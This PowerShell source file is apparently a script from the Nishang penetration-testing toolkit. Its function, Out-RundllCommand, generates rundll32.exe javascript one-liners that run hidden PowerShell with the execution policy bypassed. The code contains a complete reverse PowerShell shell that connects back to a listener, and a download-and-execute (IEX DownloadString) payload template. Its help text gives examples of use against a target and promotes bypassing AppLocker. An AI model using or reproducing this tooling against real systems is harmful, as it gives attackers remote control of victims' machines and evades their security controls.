function Out-RundllCommand
{
<#
.SYNOPSIS
Nishang script that can be used for generating rundll32.exe one line commands to run PowerShell commands and scripts or a 
reverse PowerShell session. Also useful for bypassing AppLocker.

.DESCRIPTION
This script generates rundll32 commands which can be used to to run PowerShell commands and scripts.
The reverse shell connects back to the specified netcat/powercat listener and provides an interactive PowerShell shell. 

The script is based on the work by Casey Smith (@subTee)

.PARAMETER IPAddress
The IP address on which the listener listens. Make sure that the IP address specified here is reachable from the target.

.PARAMETER Port
The port on which the connection is establised. 

.EXAMPLE
PS > Out-RundllCommand -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53"

Use above when you want to use the payload which is a powershell download and execute one-liner.

.EXAMPLE
# netcat -lvp 443

Start a netcat/Powercat listener.

PS > Out-RundllCommand -Reverse -IPAddress 192.168.230.1 -Port 443

Use above command to get a reverse PowerShell session on the target.

.EXAMPLE
PS > Out-RundllCommand -Payload "calc.exe"

Use above for executing a custom payload.


.LINK
http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html
https://github.com/samratashok/nishang
#> 

    [CmdletBinding(DefaultParameterSetName="payload")] Param(

        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="payload")]
        [String]
        $Payload,

        [Parameter(Position = 1, Mandatory = $false, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $false, ParameterSetName="payload")]
        [String]
        $PayloadURL,

        [Parameter(Position = 2, Mandatory = $false, ParameterSetName="reverse")]
        [Parameter(Position = 2, Mandatory = $false, ParameterSetName="payload")]
        [String]
        $Arguments,

        [Parameter(Position = 3, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 3, Mandatory = $false, ParameterSetName="payload")]
        [String]
        $IPAddress,

        [Parameter(Position = 4, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 4, Mandatory = $false, ParameterSetName="payload")]
        [Int]
        $Port,
        
        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $OutputPath = "$pwd\rundll32.txt",

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse

    )

    
    #Check if the Reverse switch is set
    if ($Reverse)
    {
        $cmd = "rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();r=new%20ActiveXObject(""WScript.Shell"").run(""powershell -w h -ep bypass `$sm=(New-Object Net.Sockets.TCPClient('$IPAddress',$Port)).GetStream();[byte[]]`$bt=0..65535|%{0};while((`$i=`$sm.Read(`$bt, 0, `$bt.Length)) -ne 0){;`$d=(New-Object Text.ASCIIEncoding).GetString(`$bt,0, `$i);`$sb=(iex `$d 2>&1 | Out-String );`$sb2=`$sb + 'PS ' + (pwd).Path + '> ';`$sb=([text.encoding]::ASCII).GetBytes(`$sb2);`$sm.Write(`$sb,0,`$sb.Length);`$sm.Flush()}"",0,true);"
    }

    else
    {
        #Check if the payload url has been provided by the user
        if($PayloadURL)
        {
            $Payload = "powershell -w h -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
        }
        $cmd = "rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();r=new%20ActiveXObject(""WScript.Shell"").run(""$Payload"",0,true);"
    }  
    Write-Output $cmd
    Write-Warning "Copy the command from the $OutputPath file to avoid errors."
    Out-File -InputObject $cmd -FilePath $OutputPath
    

}

